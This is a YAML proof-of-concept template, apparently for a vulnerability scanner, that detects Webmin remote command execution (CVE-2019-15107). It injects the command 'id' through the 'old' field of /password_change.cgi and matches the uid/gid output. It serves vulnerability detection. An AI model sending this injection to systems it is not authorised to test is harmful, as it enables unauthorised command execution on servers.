name: poc-yaml-Webmin-CVE-2019-15107-RCE
rules:
  - method: GET
    path: /password_change.cgi
    headers:
      User-Agent: >-
        Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
        Trident/5.0)
    body: user=roovt&pam=&expired=2&old=id&new1=test2&new2=test2
    follow_redirects: false
    expression: |
      status == 200
    search: <tt>(.*?)/password_change.cgi<\/tt>
  - method: POST
    path: /password_change.cgi
    headers:
      Referer: "{{1}}"
    body: user=roovt&pam=&expired=2&old=id&new1=test2&new2=test2
    follow_redirects: false
    expression: >
      r"uid=\d{1,5}\(.{0,50}\) gid=\d{1,5}\(.{0,50}\)
      groups=\d{1,5}\(.{0,50}\)".bmatches(body)
detail:
  description: Webmin 远程命令执行漏洞（CVE-2019-15107）
  vulhub: https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107
